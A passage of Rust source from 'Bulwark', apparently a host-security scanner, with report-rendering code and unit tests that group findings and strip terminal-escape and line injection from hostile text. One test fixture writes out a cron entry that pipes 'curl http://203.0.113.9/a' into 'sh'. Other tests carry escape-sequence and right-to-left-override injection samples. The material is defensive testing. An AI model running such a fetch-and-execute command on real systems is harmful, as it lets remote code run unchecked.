        ("rule", &scan.rule_load_errors),
    ] {
        for e in errs {
            gaps.push(st.yellow(&format!(
                "{} didn't load: {}",
                load_error_subject(label, &e.path),
                clip(&safe(&e.message), 140)
            )));
        }
    }
    // Lines that weren't log entries, when others were: normal for a file with multi-line
    // payloads, but worth knowing. (When nothing was recognised, a warning above says so.)
    if scan.lines_unrecognized > 0 && scan.events_read > 0 {
        let n = scan.lines_unrecognized as usize;
        gaps.push(format!(
            "{n} {} weren't log entries and were skipped",
            plural(n, "line", "lines")
        ));
    }
    if !scan.read_errors.is_empty() {
        let n = scan.read_errors.len();
        gaps.push(format!(
            "{n} {} couldn't be read",
            plural(n, "line", "lines")
        ));
    }
    for e in &scan.rule_eval_errors {
        gaps.push(st.yellow(&clip(&safe(e), 160)));
    }
    let not_analyzed = nothing_analyzed_reason(scan);
    // What to do about it, unless a warning from the scan already says.
    let mut actions = Vec::new();
    if not_analyzed.is_some() && scan.warnings.is_empty() && scan.rules_loaded > 0 {
        actions.push(if scan.events_read == 0 {
            format!(
                "Check that the file has log entries in it, or that this system keeps a journal \
                 ({} shows it). {} reads a log file instead.",
                st.bold("journalctl -b"),
                st.bold("--from-file /var/log/auth.log")
            )
        } else {
            format!(
                "Bulwark reads sign-in, sudo and similar entries: {} lists the kinds it knows.",
                st.bold("bulwarkctl logs decoders list")
            )
        });
    }

    render_body(
        Body {
            subtitle: format!(
                "logs · {} {} read, {} understood",
                scan.events_read,
                plural(scan.events_read as usize, "event", "events"),
                scan.events_decoded
            ),
            problems: group(items),
            clean: match &not_analyzed {
                Some(why) => Err(why.as_str()),
                None => Ok("Nothing suspicious in the events read."),
            },
            actions,
            gaps,
        },
        opts,
    )
}

/// Shortens a path under the home directory to `~/…`, which is both shorter and how people read it.
fn tilde(path: &str, home: Option<&str>) -> String {
    match home {
        Some(h)
            if !h.is_empty() && path.starts_with(h) && path[h.len()..].starts_with(['/', '\\']) =>
        {
            format!("~{}", &path[h.len()..])
        }
        _ => path.to_string(),
    }
}

/// The AI coding-agent report (`bulwarkctl ai scan`).
pub fn render_ai(report: &AiScanReport, home: Option<&str>, opts: &ReportOptions) -> String {
    let st = Style { on: opts.color };
    let items = report
        .findings
        .iter()
        .map(|f| {
            let file = tilde(&f.file, home);
            Item {
                rule_id: &f.rule_id,
                severity: f.severity,
                title: &f.title,
                explanation: &f.explanation,
                fix_hint: &f.fix_hint,
                place: match f.line {
                    Some(l) => format!("{file}:{l}"),
                    None => file,
                },
                evidence: Some(&f.evidence),
                raw_path: Some(&f.file),
                tool: Some(&f.tool),
            }
        })
        .collect();

    let mut actions = Vec::new();
    let redactable = report.redactable_files().len();
    if redactable > 0 {
        actions.push(format!(
            "{redactable} agent {} leaked secrets Bulwark can remove — preview with {}, then add --apply",
            plural(redactable, "file holds", "files hold"),
            st.bold("bulwarkctl ai redact"),
        ));
        actions.push(
            "Removing a secret from a file doesn't make it safe again: rotate it with its provider."
                .to_string(),
        );
    }

    let mut gaps = Vec::new();
    if report.cancelled {
        gaps.push(st.yellow("the scan was stopped before it finished — results are partial"));
    }
    if report.workspaces_capped {
        gaps.push(format!(
            "too many projects to check them all — narrow it with {}",
            st.bold("--target <dir>")
        ));
    }
    if !report.errors.is_empty() {
        let n = report.errors.len();
        // Mostly unreadable files, but also a check that couldn't run — so not "files".
        gaps.push(st.yellow(&format!(
            "{n} {} couldn't be checked{}",
            plural(n, "item", "items"),
            if opts.all {
                ":"
            } else {
                " — --all lists them"
            }
        )));
        if opts.all {
            for e in &report.errors {
                gaps.push(format!(
                    "  {}",
                    clip(&crate::term_safe(&tilde(e, home)), 140)
                ));
            }
        }
    }

    let w = report.workspaces_scanned.len();
    render_body(
        Body {
            subtitle: {
                let files = format!(
                    "{} agent {} checked",
                    report.artifacts_scanned,
                    plural(report.artifacts_scanned, "file", "files")
                );
                if w == 0 {
                    format!("AI coding agents · {files}")
                } else {
                    format!(
                        "AI coding agents · {w} {} · {files}",
                        plural(w, "project", "projects")
                    )
                }
            },
            problems: group(items),
            clean: Ok("No leaked secrets or risky agent settings in the files checked."),
            actions,
            gaps,
        },
        opts,
    )
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    const NIL: &str = "00000000-0000-0000-0000-000000000000";
    const NOW: &str = "2026-11-01T00:00:00Z";

    fn finding(rule: &str, sev: Severity, title: &str, path: &str) -> Finding {
        serde_json::from_value(json!({
            "id": NIL, "rule_id": rule, "severity": sev, "title": title,
            "explanation": "Anyone who copies the file can use the key, from any computer, without knowing anything else. More detail follows here.",
            "fix_hint": "1. Add a passphrase: ssh-keygen -p -f <key>\n2. Then something else.",
            "context": { "path": path },
            "first_seen": NOW, "last_seen": NOW, "status": "open", "scan_run_id": NIL,
        }))
        .unwrap()
    }

    fn scan(findings: Vec<Finding>) -> ScanRun {
        let evaluated: Vec<String> = (0..7).map(|i| format!("R{i}")).collect();
        let mut s: ScanRun = serde_json::from_value(json!({
            "id": NIL, "started_at": NOW, "finished_at": NOW, "host_fingerprint": "host/6.8",
            "rules_loaded": 9, "rule_load_errors": [], "collector_errors": [],
            "privileged_collectors_skipped": ["sudoers"], "rules_evaluated": evaluated,
            "rules_not_applicable": ["NA"], "findings": [],
        }))
        .unwrap();
        s.findings = findings;
        s
    }

    fn opts(all: bool) -> ReportOptions {
        ReportOptions {
            all,
            color: false,
            target: "this computer".into(),
            columns: None,
            ascii: false,
        }
    }

    #[test]
    fn problems_are_grouped_ranked_and_explained() {
        let s = scan(vec![
            finding(
                "BLWK-SSH-012",
                Severity::High,
                "SSH private key is not passphrase-protected: a",
                "/k/a",
            ),
            finding(
                "BLWK-SSH-012",
                Severity::High,
                "SSH private key is not passphrase-protected: b",
                "/k/b",
            ),
            finding(
                "BLWK-NET-005",
                Severity::Medium,
                "A dev service listens",
                "port 5432",
            ),
            finding("BLWK-BANN-001", Severity::Info, "No banner", "/etc/issue"),
        ]);
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(r.contains("3 problems to fix"), "{r}");
        // One line for both keys, with the shared title and a count.
        assert!(
            r.contains("SSH private key is not passphrase-protected  ×2"),
            "{r}"
        );
        assert!(r.contains("Anyone who copies the file can use the key"));
        assert!(
            !r.contains("More detail follows"),
            "a sentence long enough to stand alone isn't extended"
        );
        assert!(r.contains("→ Add a passphrase: ssh-keygen -p -f <key>"));
        // High before medium; info folded behind --all.
        assert!(r.find("SSH private key").unwrap() < r.find("A dev service").unwrap());
        assert!(!r.contains("No banner"));
        assert!(r.contains("and 1 low-priority suggestion — run with --all"));
        // Honest footer: admin-only areas, and checks that couldn't run (9 loaded, which leaves out the one that does not apply, minus 7 that ran = 2).
        assert!(r.contains("1 check area needs admin rights"), "{r}");
        assert!(r.contains("2 checks couldn't run here"), "{r}");
        assert!(!r.contains('\x1b'), "no colour when not asked");

        let all = render(&s, &Ignores::default(), &opts(true));
        assert!(all.contains("No banner") && all.contains("· /k/a") && all.contains("· /k/b"));
        assert!(r.contains("in: /k/a, /k/b"), "{r}");
    }

    #[test]
    fn titles_that_agree_only_at_the_end_name_the_commonest_kind_and_count_the_rest() {
        let key = |kind: &str, file: &str| {
            finding(
                "BLWK-AI-001",
                Severity::High,
                &format!("{kind} exposed in AI context"),
                file,
            )
        };
        let s = scan(vec![
            key("Curl auth user", "/t/a"),
            key("Anthropic API key", "/t/b"),
            key("Anthropic API key", "/t/c"),
            key("OpenAI API key", "/t/d"),
        ]);
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(
            r.contains("Anthropic API key and 2 other kinds exposed in AI context  ×4"),
            "{r}"
        );
        // One other kind reads as one.
        let s = scan(vec![
            key("Curl auth user", "/t/a"),
            key("OpenAI API key", "/t/b"),
        ]);
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(
            r.contains("Curl auth user and 1 other kind exposed in AI context"),
            "{r}"
        );
    }

    #[test]
    fn rules_that_do_not_apply_are_not_subtracted_twice() {
        // On WSL, rules skipped there are already left out of `rules_loaded`. Subtracting them
        // again hid that many checks that really could not run.
        let mut s = scan(vec![]);
        s.rules_not_applicable = (0..5).map(|i| format!("WSL{i}")).collect();
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(r.contains("2 checks couldn't run here"), "{r}");
    }

    #[test]
    fn checks_that_need_admin_rights_are_counted_once() {
        // 9 loaded (the one not applicable is not among them), 7 ran; the 2 left are both admin-only. The footer used to
        // say "1 check area needs admin rights" and then "2 checks couldn't run here" as well.
        let mut s = scan(vec![]);
        s.rules_needing_admin = vec!["P1".into(), "P2".into()];
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(r.contains("2 checks need admin rights — run"), "{r}");
        assert!(!r.contains("couldn't run here"), "{r}");
        assert!(!r.contains("check area"), "{r}");

        // One admin-only, one that failed for another reason: both lines, each counted once.
        s.rules_needing_admin = vec!["P1".into()];
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(r.contains("1 check needs admin rights"), "{r}");
        assert!(r.contains("1 check couldn't run here"), "{r}");
    }

    #[test]
    fn a_shared_title_never_ends_inside_the_place() {
        let t = |a: &str, b: &str| {
            let fa = finding("R", Severity::High, a, "/a");
            let fb = finding("R", Severity::High, b, "/b");
            Problem {
                rule_id: "R",
                severity: Severity::High,
                items: vec![Item::from(&fa), Item::from(&fb)],
            }
            .title()
        };
        assert_eq!(
            t(
                "A service listens on all interfaces (port 9000)",
                "A service listens on all interfaces (port 5432)"
            ),
            "A service listens on all interfaces"
        );
        assert_eq!(
            t(
                "Module not blacklisted: usb-storage",
                "Module not blacklisted: dccp"
            ),
            "Module not blacklisted"
        );
        // Cut back to a whole word, and not left hanging on the word that led up to the place.
        assert_eq!(
            t("Key unprotected in alpha", "Key unprotected in alpine"),
            "Key unprotected"
        );
        assert_eq!(
            t(
                "SSH brute-force from 203.0.113.9",
                "SSH brute-force from 198.51.100.7"
            ),
            "SSH brute-force"
        );
        assert_eq!(t("Same", "Same"), "Same");
    }

    #[test]
    fn a_grouped_problem_explains_itself_with_what_every_place_shares() {
        let mut a = finding("R", Severity::High, "t", "/a");
        let mut b = finding("R", Severity::High, "t", "/b");
        a.explanation = "Service on port 9000. Anyone on the network can reach it, from any device. Port 9000 is open.".into();
        b.explanation = "Service on port 5432. Anyone on the network can reach it, from any device. Port 5432 is open.".into();
        let p = Problem {
            rule_id: "R",
            severity: Severity::High,
            items: vec![Item::from(&a), Item::from(&b)],
        };
        // The shared sentence, and never a later one that names a single place.
        assert_eq!(
            p.why(),
            "Anyone on the network can reach it, from any device."
        );
        let one = Problem {
            rule_id: "R",
            severity: Severity::High,
            items: vec![Item::from(&a)],
        };
        // A short first sentence is the bare fact, so the reason after it comes along.
        assert_eq!(
            one.why(),
            "Service on port 9000. Anyone on the network can reach it, from any device."
        );
        assert_eq!(
            sentences("Bind to 0.0.0.0 now. Then v1.2 is fine"),
            ["Bind to 0.0.0.0 now.", "Then v1.2 is fine"]
        );
    }

    #[test]
    fn only_a_list_marker_is_stripped_from_the_first_step() {
        assert_eq!(
            first_step("1. Add a passphrase.\n2. Next."),
            "Add a passphrase."
        );
        assert_eq!(first_step("\n  12) Restart sshd."), "Restart sshd.");
        assert_eq!(
            first_step("127.0.0.1 is safer than 0.0.0.0."),
            "127.0.0.1 is safer than 0.0.0.0."
        );
        assert_eq!(
            first_step("2FA protects the account."),
            "2FA protects the account."
        );
        assert_eq!(first_step(""), "");
    }

    #[test]
    fn a_grouped_why_borrows_a_sentence_that_differs_only_by_agent() {
        let mut a = finding("R", Severity::High, "t", "/p/one/.claude/settings.json");
        let mut b = finding("R", Severity::High, "t", "/p/two/.cursor/hooks.json");
        a.explanation = "This file defines hooks. Claude Code runs them on every event.".into();
        b.explanation = "This file defines hooks. Cursor runs them on every event.".into();
        let item = |f, tool| Item {
            tool: Some(tool),
            ..Item::from(f)
        };
        let p = Problem {
            rule_id: "R",
            severity: Severity::High,
            items: vec![item(&a, "Claude Code"), item(&b, "Cursor")],
        };
        assert_eq!(
            p.why(),
            "This file defines hooks. Claude Code runs them on every event."
        );
        // Nothing shared at all: no why line, rather than one about a single place.
        let mut c = finding("R", Severity::High, "t", "/x");
        let mut d = finding("R", Severity::High, "t", "/y");
        c.explanation = "Server \"a\" is open.".into();
        d.explanation = "Server \"b\" is open.".into();
        let p = Problem {
            rule_id: "R",
            severity: Severity::High,
            items: vec![Item::from(&c), Item::from(&d)],
        };
        assert_eq!(p.why(), "");
        // Without knowing the agents, a differing sentence is not borrowed.
        let p = Problem {
            rule_id: "R",
            severity: Severity::High,
            items: vec![Item::from(&a), Item::from(&b)],
        };
        assert_eq!(p.why(), "This file defines hooks.");
    }

    #[test]
    fn a_single_place_is_shown_only_when_it_is_a_file() {
        assert!(looks_like_a_file("~/.ssh/id_ed25519"));
        assert!(looks_like_a_file("C:\\Users\\u\\.npmrc"));
        assert!(!looks_like_a_file("port 2222"));
        assert!(!looks_like_a_file("usb-storage"));
    }

    #[test]
    fn a_cut_line_ends_on_a_whole_word() {
        let lines = wrap("aaaa bbbb cccc dddd eeee ffff", 14, 1);
        assert_eq!(lines, vec!["aaaa bbbb …"]);
    }

    #[test]
    fn a_place_is_said_once() {
        // The title names the file the `in:` line also shows.
        let s = scan(vec![finding(
            "BLWK-DEV-005",
            Severity::Medium,
            "SSH forwards your agent to every server (/home/u/.ssh/config)",
            "/home/u/.ssh/config",
        )]);
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(
            r.contains("SSH forwards your agent to every server\n"),
            "{r}"
        );
        assert!(r.contains("in: /home/u/.ssh/config"), "{r}");

        // A whole-machine finding's place is its title; a slash in it doesn't make it a file.
        let mut f = finding(
            "BLWK-SSH-005",
            Severity::Medium,
            "SSH TCP forwarding/tunneling is enabled",
            "",
        );
        f.context = Default::default();
        let r = render(&scan(vec![f]), &Ignores::default(), &opts(false));
        assert!(!r.contains("in: "), "{r}");
    }

    #[test]
    fn long_text_wraps_and_is_cut_with_an_ellipsis() {
        let text = "one two three four five six seven eight nine ten";
        assert_eq!(
            wrap(text, 14, 9),
            ["one two three", "four five six", "seven eight", "nine ten"]
        );
        let cut = wrap(text, 14, 2);
        assert_eq!(cut.len(), 2);
        assert!(
            cut[1].ends_with('…') && cut[1].chars().count() <= 14,
            "{cut:?}"
        );
        assert_eq!(wrap("", 10, 2), Vec::<String>::new());
    }

    fn ai_report(files: &[&str]) -> AiScanReport {
        let findings: Vec<serde_json::Value> = files
            .iter()
            .map(|file| {
                json!({
                    "id": NIL, "rule_id": "BLWK-AI-001", "severity": "high", "tool": "Claude Code",
                    "title": "GitHub PAT exposed in AI context",
                    "explanation": format!("GitHub PAT found in {file} at line 1. Anything written into an assistant's memory should be treated as leaked — rotate it."),
                    "fix_hint": "Remove the key and rotate it.",
                    "file": file, "line": 1, "evidence": "ghp_…[masked]", "references": [],
                    "redactable": true,
                })
            })
            .collect();
        serde_json::from_value(json!({
            "id": NIL, "started_at": NOW, "finished_at": NOW, "host_fingerprint": "h",
            "workspaces_scanned": [], "artifacts_scanned": 3, "findings": findings,
            "workspaces_capped": true, "errors": ["/home/u/.claude/x.jsonl: permission denied"],
        }))
        .unwrap()
    }

    #[test]
    fn the_ai_report_explains_why_not_where_and_offers_redaction() {
        let r = render_ai(
            &ai_report(&[
                "/home/u/.claude/projects/a/memory/notes.md",
                "/home/u/.claude/projects/b/memory/notes.md",
            ]),
            Some("/home/u"),
            &opts(false),
        );
        assert!(
            r.contains("AI coding agents · 3 agent files checked"),
            "{r}"
        );
        assert!(r.contains("GitHub PAT exposed in AI context  ×2"), "{r}");
        // The sentence naming the path is the "what"; the why is the one after it.
        assert!(
            r.contains("Anything written into an assistant's memory should be treated as leaked"),
            "{r}"
        );
        assert!(!r.contains("found in /home/u"), "{r}");
        assert!(
            r.contains("in: ~/.claude/projects/a/memory/notes.md:1, …")
                && r.contains("/b/memory/notes.md:1"),
            "{r}"
        );
        assert!(
            r.contains("2 agent files hold leaked secrets Bulwark can remove"),
            "{r}"
        );
        assert!(r.contains("rotate it with its provider"));
        assert!(r.contains("too many projects to check them all"));
        assert!(r.contains("1 item couldn't be checked — --all lists them"));
        assert!(!r.contains("ghp_"), "evidence only under --all");

        let all = render_ai(
            &ai_report(&["/home/u/.claude/n.md"]),
            Some("/home/u"),
            &opts(true),
        );
        assert!(all.contains("· ~/.claude/n.md:1  ghp_…[masked]"), "{all}");
        assert!(
            all.contains("~/.claude/x.jsonl: permission denied"),
            "{all}"
        );
    }

    #[test]
    fn the_place_line_always_fits() {
        let long: Vec<String> = (0..6)
            .map(|i| {
                format!(
                    "~/.claude/projects/some-long-project-name-{i}/subagents/agent-{i}.jsonl:1131"
                )
            })
            .collect();
        let line = place_line(&long, TEXT_WIDTH);
        assert!(line.chars().count() <= TEXT_WIDTH - 4, "{line}");
        assert!(
            line.contains(".jsonl:1131") && line.ends_with("more"),
            "{line}"
        );
        // Hundreds of places: the "+N more" suffix is long, the first place still shows.
        let many: Vec<String> = (0..100_000)
            .map(|i| format!("/a/very/long/path/number/{i}/file.jsonl"))
            .collect();
        let line = place_line(&many, TEXT_WIDTH);
        assert!(
            line.contains("file.jsonl") && line.chars().count() <= TEXT_WIDTH - 4,
            "{line}"
        );
        assert_eq!(clip("abc", 0), "");
        assert_eq!(clip_start("abc", 0), "");
        let short: Vec<String> = ["port 1", "port 2", "port 3", "port 4"]
            .map(String::from)
            .to_vec();
        assert_eq!(
            place_line(&short, TEXT_WIDTH),
            "port 1, port 2, port 3, port 4"
        );
    }

    #[test]
    fn long_places_keep_their_file_name() {
        assert_eq!(
            clip_start("/a/very/long/path/to/notes.md", 12),
            "…to/notes.md"
        );
        assert_eq!(tilde("/home/u/x", Some("/home/u")), "~/x");
        assert_eq!(tilde("/home/user2/x", Some("/home/u")), "/home/user2/x");
    }

    fn log_scan(events_read: u64, unrecognized: u64) -> bulwark_core::LogScanRun {
        serde_json::from_value(json!({
            "id": NIL, "started_at": NOW, "finished_at": NOW, "host_fingerprint": "h",
            "events_read": events_read, "events_decoded": events_read, "decoders_loaded": 4,
            "rules_loaded": 8, "decoder_load_errors": [], "rule_load_errors": [],
            "read_errors": [], "rule_eval_errors": [],
            "warnings": if events_read == 0 && unrecognized > 0 { vec!["nothing was analyzed"] } else { vec![] },
            "lines_unrecognized": unrecognized, "findings": [],
        }))
        .unwrap()
    }

    #[test]
    fn a_log_scan_that_read_nothing_usable_draws_no_checkmark() {
        let bad = log_scan(0, 5);
        assert!(nothing_analyzed_reason(&bad).is_some());
        let r = render_logs(&bad, &opts(false));
        assert!(
            r.contains("! None of this input could be read as log entries"),
            "{r}"
        );
        assert!(!r.contains('✓'), "{r}");
        assert!(r.contains("nothing was analyzed"), "{r}");

        let ok = log_scan(120, 3);
        assert!(nothing_analyzed_reason(&ok).is_none());
        let r = render_logs(&ok, &opts(false));
        assert!(
            r.contains("✓ Nothing suspicious in the events read."),
            "{r}"
        );
        assert!(
            r.contains("3 lines weren't log entries and were skipped"),
            "{r}"
        );
        assert!(r.contains("120 events read"), "{r}");
    }

    /// The tester's case: an empty `--from-file`, or a journal that isn't there, printed
    /// "0 events read … ✓ Nothing suspicious" and exited 0. Nothing read is not a clean log.
    #[test]
    fn a_log_scan_of_empty_input_is_not_a_clean_result() {
        let empty = log_scan(0, 0);
        let why = nothing_analyzed_reason(&empty).expect("empty input analyzed nothing");
        assert!(why.contains("No log entries were read"), "{why}");
        let r = render_logs(&empty, &opts(false));
        assert!(!r.contains('✓') && !r.contains("Nothing suspicious"), "{r}");
        assert!(r.contains("! No log entries were read"), "{r}");
        // …and it says what to check, since no warning from the scan does.
        assert!(
            r.contains("journalctl -b") && r.contains("--from-file"),
            "{r}"
        );
    }

    /// Entries were read and none was of a kind Bulwark knows (a kernel-only log, say): the rules
    /// had nothing to look at, so there is no check mark either.
    #[test]
    fn a_log_scan_that_understood_no_entry_is_not_a_clean_result() {
        let mut scan = log_scan(500, 0);
        scan.events_decoded = 0;
        let why = nothing_analyzed_reason(&scan).expect("nothing was understood");
        assert!(why.contains("500 log entries were read"), "{why}");
        let r = render_logs(&scan, &opts(false));
        assert!(!r.contains('✓') && !r.contains("Nothing suspicious"), "{r}");
        assert!(r.contains("bulwarkctl logs decoders list"), "{r}");

        // One entry understood is enough for the result to mean something.
        scan.events_decoded = 1;
        assert!(nothing_analyzed_reason(&scan).is_none());
        assert!(render_logs(&scan, &opts(false)).contains('✓'));
        // No decoders or rules at all is the third case, as before.
        scan.rules_loaded = 0;
        assert!(nothing_analyzed_reason(&scan).is_some());
    }

    #[test]
    fn a_clean_scan_never_says_all_clear() {
        let r = render(&scan(vec![]), &Ignores::default(), &opts(false));
        assert!(r.contains("Nothing to fix from the checks that ran."));
        assert!(!r.to_lowercase().contains("all clear"));
        assert!(
            r.contains("Not covered by this scan:"),
            "the gaps are still stated: {r}"
        );
    }

    #[test]
    fn ignored_findings_are_counted_not_listed_and_hostile_text_is_neutralised() {
        let mut ig = Ignores::default();
        ig.rules.insert("BLWK-NET-005".into());
        let s = scan(vec![
            finding("BLWK-NET-005", Severity::High, "listens", "port 1"),
            finding(
                "BLWK-X-001",
                Severity::High,
                "evil \x1b]0;pwned\x07 title",
                "/x",
            ),
        ]);
        let r = render(&s, &ig, &opts(false));
        assert!(!r.contains("listens"));
        assert!(r.contains("1 finding you chose to ignore"));
        assert!(!r.contains('\x1b') && !r.contains('\x07'));
    }

    #[test]
    fn colour_wraps_only_when_asked() {
        let s = scan(vec![finding("BLWK-SSH-012", Severity::Critical, "t", "/k")]);
        let mut o = opts(false);
        o.color = true;
        assert!(render(&s, &Ignores::default(), &o).contains("\x1b[1;31m"));
    }

    /// A monitored machine answered with a title holding a newline and a right-to-left override,
    /// and got a line of its own in the report. Every field is one line now, whatever is in it.
    #[test]
    fn a_hostile_machine_cannot_add_lines_to_the_report() {
        let mut f = finding(
            "BLWK-X-001",
            Severity::High,
            "Real title\nCRITICAL: all clear, nothing to fix\r\u{202e}txt.exe\u{200b}",
            "/x\n  ✓ Nothing to fix from the checks that ran.",
        );
        f.explanation = "First.\nINJECTED LINE\u{202e} second.".into();
        let mut s = scan(vec![f]);
        s.collector_errors = serde_json::from_value(json!([
            {"collector": "c", "message": "boom\nNot covered by this scan: nothing", "skipped": false}
        ]))
        .unwrap();
        for all in [false, true] {
            let r = render(&s, &Ignores::default(), &opts(all));
            for line in r.lines() {
                let line = line.trim_start();
                assert!(!line.starts_with("CRITICAL: all clear"), "{r}");
                assert!(!line.starts_with("INJECTED"), "{r}");
                assert!(!line.starts_with("✓"), "{r}");
                assert!(
                    !line.starts_with("Not covered by this scan: nothing"),
                    "{r}"
                );
            }
            assert!(!r.contains('\r') && !r.contains('\u{202e}') && !r.contains('\u{200b}'));
            // The text is still there, on the line it belongs to.
            assert!(r.contains("Real title CRITICAL: all clear"), "{r}");
        }
    }

    /// Bulwark's own fix hints run over several lines; the first step is still picked out, and
    /// a line break inside a hostile "step" cannot become a line of the report.
    #[test]
    fn a_multi_line_fix_still_shows_its_first_step() {
        let mut f = finding("BLWK-SSH-012", Severity::High, "t", "/k/a");
        f.fix_hint =
            "\n1. Add a passphrase: ssh-keygen -p -f <key>\n2. Then something else.".into();
        let r = render(&scan(vec![f]), &Ignores::default(), &opts(false));
        assert!(
            r.contains("→ Add a passphrase: ssh-keygen -p -f <key>"),
            "{r}"
        );
        assert!(!r.contains("Then something else"), "{r}");
    }

    /// The grouped kernel-module problem showed the first module's command under "×4".
    #[test]
    fn a_grouped_fix_names_what_differs_instead_of_one_place() {
        let module = |name: &str| {
            let mut f = finding(
                "BLWK-KERNEL-020",
                Severity::Medium,
                "Module not blacklisted",
                "",
            );
            f.title = format!("Kernel module not blacklisted: {name}");
            f.context = serde_json::from_value(json!({ "module": name })).unwrap();
            f.fix_hint = format!(
                "If '{name}' isn't actually needed on this host, add 'install {name} /bin/true' to a file under /etc/modprobe.d/."
            );
            f
        };
        let s = scan(vec![module("dccp"), module("sctp"), module("rds")]);
        let r = render(&s, &Ignores::default(), &opts(true));
        assert!(
            r.contains("If '<module>' isn't actually needed on this host, add 'install <module>"),
            "{r}"
        );
        assert!(!r.contains("install dccp"), "{r}");
        assert!(
            r.contains("· module=dccp") && r.contains("· module=rds"),
            "{r}"
        );

        // One place keeps its own command, and steps that differ for another reason are left be.
        let one = render(
            &scan(vec![module("dccp")]),
            &Ignores::default(),
            &opts(false),
        );
        assert!(one.contains("install dccp /bin/true"), "{one}");
        assert_eq!(
            replace_whole_word("words and rds", "rds", "<m>"),
            "words and <m>"
        );
        assert_eq!(
            place_names("source=/etc/crontab · line=3"),
            [("source", "/etc/crontab"), ("line", "3")]
        );
        assert_eq!(place_names("/home/u/.npmrc"), [("file", "/home/u/.npmrc")]);
        assert!(place_names("port 22 on 0.0.0.0").is_empty());
    }

    /// `--all` listed "· auditd is not installed" under the title "auditd is not installed".
    #[test]
    fn a_whole_machine_finding_is_not_listed_as_its_own_place() {
        let mut f = finding(
            "BLWK-LOG-001",
            Severity::Medium,
            "auditd is not installed",
            "",
        );
        f.context = Default::default();
        let r = render(&scan(vec![f]), &Ignores::default(), &opts(true));
        assert_eq!(r.matches("auditd is not installed").count(), 1, "{r}");
        assert!(!r.contains("· auditd"), "{r}");
    }

    /// A place that is not a path is cut at its end, on a whole word; a path keeps its file name
    /// and starts at a whole folder name.
    #[test]
    fn a_long_place_is_never_cut_inside_a_word() {
        let cron =
            "source=/var/spool/cron/crontabs/root · command=curl http://203.0.113.9/a | sh -s";
        let cut = clip_place(cron, 48);
        assert!(cut.chars().count() <= 48, "{cut}");
        assert!(
            cut.starts_with("source=/var/spool/cron/crontabs/root"),
            "{cut}"
        );
        assert!(cut.ends_with('…'), "{cut}");
        let kept = cut.trim_end_matches('…');
        assert!(
            cron[kept.len()..].starts_with(' '),
            "the cut must fall between words: {cut:?}"
        );
        assert_eq!(clip_place("short", 48), "short");

        let path = "/home/someone/projects/a-long-project/config/settings.json";
        let cut = clip_place(path, 30);
        assert!(cut.chars().count() <= 30, "{cut}");
        assert!(
            cut.starts_with("…/") && cut.ends_with("/settings.json"),
            "{cut}"
        );
    }

    #[test]
    fn a_load_error_names_the_rule_once() {
        let mut s = scan(vec![]);
        s.rule_load_errors = serde_json::from_value(json!([
            {"path": "rule id MY-001", "message": "duplicate rule id 'MY-001'"},
            {"path": "/r/broken.yaml", "message": "did not find expected node"},
        ]))
        .unwrap();
        let r = render(&s, &Ignores::default(), &opts(false));
        assert!(r.contains("rule MY-001 didn't load: duplicate"), "{r}");
        assert!(!r.contains("rule rule"), "{r}");
        assert!(r.contains("rule file /r/broken.yaml didn't load"), "{r}");
    }

    /// The report was laid out for ~93 columns whatever the terminal. On a terminal it now fits
    /// the width it has, down to a floor; into a pipe it is laid out as before.
    #[test]
    fn the_report_fits_the_terminal_it_is_printed_on() {
        let mut f = finding(
            "BLWK-SSH-012",
            Severity::High,
            "SSH private key is not protected by a passphrase on this computer",
            "/home/u/.ssh/id_ed25519",
        );
        f.rule_id = "MY-1".into(); // no "more:" link, which is one unbreakable URL
                                   // One problem of every severity, so the summary line is a long one too.
        let mut all = vec![f];
        for (id, sev) in [
            ("MY-2", Severity::Critical),
            ("MY-3", Severity::Medium),
            ("MY-4", Severity::Low),
            ("MY-5", Severity::Info),
        ] {
            all.push(finding(id, sev, "Another problem", "/x"));
        }
        let mut s = scan(all);
        s.privileged_collectors_skipped.clear();
        let narrow = ReportOptions {
            columns: Some(40),
            ..opts(false)
        };
        let r = render(&s, &Ignores::default(), &narrow);
        for line in r.lines() {
            assert!(
                line.chars().count() <= 40,
                "{} columns: {line:?}",
                line.chars().count()
            );
        }
        assert!(r.contains("Anyone who copies the"), "{r}");

        // A wide terminal gets the same text column as a pipe, not longer lines.
        let wide = ReportOptions {
            columns: Some(240),
            ..opts(false)
        };
        assert_eq!(wide.text_width(), TEXT_WIDTH);
        assert_eq!(opts(false).text_width(), TEXT_WIDTH);
        // And a tiny one stops shrinking where words would no longer fit.
        let tiny = ReportOptions {
            columns: Some(10),
            ..opts(false)
        };
        assert_eq!(tiny.text_width(), MIN_TEXT_WIDTH);
        // Into a pipe, a title stays on one line so it can be found with grep.
        let piped = render(&s, &Ignores::default(), &opts(false));
        assert!(
            piped.contains("SSH private key is not protected by a passphrase on this computer\n"),
            "{piped}"
        );
    }

    /// With colour on, the footer was wrapped as if its colour codes took up columns (a command
    /// in bold broke over three lines), and the severity word lost its padding.
    #[test]
    fn colour_codes_take_no_room() {
        assert_eq!(visible_width("\x1b[1;31mHigh\x1b[0m"), 4);
        assert_eq!(visible_width("plain"), 5);
        let mut s = scan(vec![finding("MY-1", Severity::High, "Title", "/k/a")]);
        s.rules_needing_admin = vec!["P1".into(), "P2".into()];
        let colour = ReportOptions {
            color: true,
            columns: Some(80),
            ..opts(false)
        };
        let r = render(&s, &Ignores::default(), &colour);
        // The whole line fits in 80 columns once the codes are not counted, so it is not broken.
        assert!(
            r.contains("\x1b[1msudo bulwarkctl scan --privileged\x1b[0m"),
            "{r:?}"
        );
        // "High" is padded to the width of the longest severity word, inside its colour.
        assert!(r.contains("\x1b[31mHigh    \x1b[0m \x1b[1mTitle"), "{r:?}");
        for line in r.lines() {
            assert!(visible_width(line) <= 80, "{line:?}");
        }
    }

    /// Under `LC_ALL=C` the bullets and arrows came out as `M-bM-^WM-^O`.
    #[test]
    fn a_locale_without_utf8_gets_ascii_symbols() {
        let s = scan(vec![
            finding("BLWK-SSH-012", Severity::High, "Key a", "/k/a"),
            finding("BLWK-SSH-012", Severity::High, "Key b", "/k/b"),
        ]);
        let ascii = ReportOptions {
            ascii: true,
            ..opts(false)
        };
        let r = render(&s, &Ignores::default(), &ascii);
        assert!(r.is_ascii(), "{r}");
